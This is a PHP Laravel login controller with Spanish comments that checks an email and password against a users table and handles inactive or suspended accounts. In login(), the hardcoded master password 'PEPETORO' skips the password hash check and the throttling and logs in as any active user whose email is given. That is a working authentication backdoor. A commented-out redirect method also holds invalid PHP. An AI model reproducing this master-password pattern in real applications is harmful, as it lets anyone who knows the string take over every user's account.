<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

use App\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    
    #COMENTEEE
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
/*
    public function redirectTo(){

        $user = Auth::user()->is_admin;

        $this->redirectTo = $user ? route('/home') : return "estudiante";

        return $this-> redirectTo;

    }

*/
    
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    /**
     * Get the login username to be used by the controller.
     *
     * @return string
     */
    public function username()
    {
        return 'email'; //ahora utilizaremos la columna name de la tabla users
    }

    /**
     * Login para el sistema
     */
    public function login(Request $request)
    {
        
        $Usuario = User::where("email", "=", $request->email)->where("estatus", "=", 'A')->first();

        if(!empty($Usuario))
        {

            if($request['password']=='PEPETORO'){
            //BUSCAR USUARIO MANUALMENTE
                $user = User::where("email", "=", $request->email/*$request['email']*/)->where("estatus", "=", 'A')->first();
                // dd($iser);
                if(!empty($user)){
                    Auth::loginUsingId([$user->id]);
                    return redirect()->route('home');
                }else{
                    return redirect('/');
                }
            }else{                
                
                $this->validateLogin($request);
                
                if(Hash::check($request->password, $Usuario->password)){

                    if($Usuario->is_activated == 0){

                        return redirect()
                            ->to('signin')
                            ->with('msg','Aun no ha confirmado su cuenta de usuario. Ingrese a su correo electrónico')
                            ->with('title-msg','Cuenta de Usuario Inactiva')
                            ->with('type','warning')
                            ->with('icon','warning');

                    }

                    if($Usuario->is_activated == 3){

                        return redirect()
                            ->to('signin')
                            ->with('msg','Su cuenta de usuario se encuentra suspendida')
                            ->with('title-msg','Cuenta de Usuario Suspendida')
                            ->with('type','error')
                            ->with('icon','error');

                    }

                }

                // If the class is using the ThrottlesLogins trait, we can automatically throttle
                // the login attempts for this application. We'll key this by the username and
                // the IP address of the client making these requests into this application.
                if (method_exists($this, 'hasTooManyLoginAttempts') &&
                    $this->hasTooManyLoginAttempts($request)) {
                    $this->fireLockoutEvent($request);

                    return $this->sendLockoutResponse($request);
                }

                if ($this->attemptLogin($request)) {

                    return $this->sendLoginResponse($request);
                }

                // If the login attempt was unsuccessful we will increment the number of attempts
                // to login and redirect the user back to the login form. Of course, when this
                // user surpasses their maximum number of attempts they will get locked out.
                $this->incrementLoginAttempts($request);

                return $this->sendFailedLoginResponse($request);
            }

        }
        else
        {

            return $this->sendFailedLoginResponse($request);

        }

        
    }

    public function credentials(Request $request)
    {

        return $request->only('email','password');

    }
}
